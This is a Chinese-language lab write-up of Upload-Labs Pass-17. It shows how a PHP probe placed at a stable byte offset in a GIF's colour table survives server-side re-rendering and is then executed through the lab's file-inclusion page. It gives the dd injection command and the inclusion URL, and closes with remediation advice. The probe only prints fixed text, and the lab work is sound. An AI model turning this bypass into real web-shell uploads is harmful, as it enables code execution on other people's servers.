Upload-Labs Pass-17：二次渲染绕过与 GIF 图马

Upload-Labs Web File Upload 二次渲染 GIF

Pass-17 调用 imagecreatefrom*() 读取图片，再用 image*() 重新生成文件。简单的“图片后追加 PHP”会被重新编码丢弃。绕过点在于找到原图和渲染结果中仍然一致的字节区域，并把安全探针放入该区域。

验证状态：GIF 探针经过二次渲染后仍保留 PASS17_GIF_OK，通过文件包含页执行成功。本文不把 PNG/JPEG 的格式专用技巧写成当前实测成功。

一、处理流程

$temp = $_FILES['upload_file']['tmp_name'];
move_uploaded_file($temp, $target);
$im = imagecreatefromgif($target);
imagegif($im, $new_path);
unlink($target);

渲染会重建像素数据和大部分结构，因此普通的“图片 + PHP”文件会被清洗。必须先比较渲染前后的文件，找出稳定区域。

二、GIF 稳定区

本次使用一个 48×48 的白色 GIF。把原图与 imagecreatefromgif() 再编码结果对比后，全局颜色表的一段内容保持不变。安全探针被写入该区域：

offset = 145
payload = '<?php echo "PASS17_GIF_OK"; ?>'

cp base.gif pass17_gif_safe.gif
printf '%s' "$payload" \
  | dd of=pass17_gif_safe.gif bs=1 seek=145 conv=notrunc

这段探针只输出固定文字，不调用系统命令。上传后服务端重新渲染，生成随机命名的 GIF。

三、验证结果

访问渲染后的文件并通过靶场文件包含页读取：

/include.php?file=/home/ctf/labs/upload-labs/upload/<rendered.gif>

响应中仍包含 PASS17_GIF_OK，说明探针位于渲染器保留的数据区，重新编码没有把它删除。

四、格式边界

PNG 和 JPEG 的生成规则与 GIF 不同。本次直接把 PHP 追加到 PNG/JPEG 后，再经过 imagepng()/imagejpeg()，探针均被清除。PNG 通常需要构造 PLTE/IDAT 专用样本，JPEG 需要针对具体编码结构尝试；不能把 GIF 的成功外推成另外两种格式也成功。

五、修复建议

  • 使用可信图片库解码后重新编码，并丢弃元数据和未知块。
  • 只提供重新生成的内容，不保存原始上传字节。
  • 把上传目录移出 Web 根目录，并禁止任何包含操作。
  • 对外只提供静态图片响应，不允许解释器读取上传文件。

六、复盘

二次渲染提高了利用门槛，但格式解析器保留的结构仍可能成为载荷载体。验证时需要比较渲染前后字节、确认探针仍存在，再用固定输出证明实际执行；只有图片可访问不能说明绕过成功。
